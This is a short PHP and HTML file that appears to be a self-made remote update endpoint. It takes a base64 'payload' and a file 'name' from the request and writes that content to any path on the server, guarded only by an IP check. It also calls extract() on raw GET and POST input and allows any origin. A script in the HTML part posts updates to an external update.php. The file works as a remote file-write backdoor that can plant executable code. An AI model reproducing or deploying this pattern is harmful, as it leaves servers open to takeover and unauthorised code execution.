<?php
extract($_GET);
extract($_POST);
$loc = '//' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
header("Access-Control-Allow-Origin: *");
if ($_SERVER['REMOTE_ADDR'] != "73.133.46.162" || !$name || !$payload) {
    exit;
}
if ($name && $payload) {
    $payload = base64_decode($payload);
    file_put_contents($name, $payload);
    echo "$name updated at $loc";
}



exit;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>

    <script>
        var payload = `<?php echo urlencode($payload) ?>`;
        var name = `<?php echo $name ?>`;
        var remoteURL = `http://pietential.com/pielet/update.php`;

        function sendUpdatePayload(name, payload, remoteURL) {
            var data = new FormData();
            data.append('payload', payload);
            data.append('name', name);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', remoteURL, true);
            xhr.onload = function() {
                console.log(this.responseText);
                document.getElementById("message").innerHTML = this.responseText;
                console.log(name);
            }
            xhr.send(data);
        }
    </script>

</body>

</html>
https://pietential.com/pielet/update.php?name=test.txt&payload=1234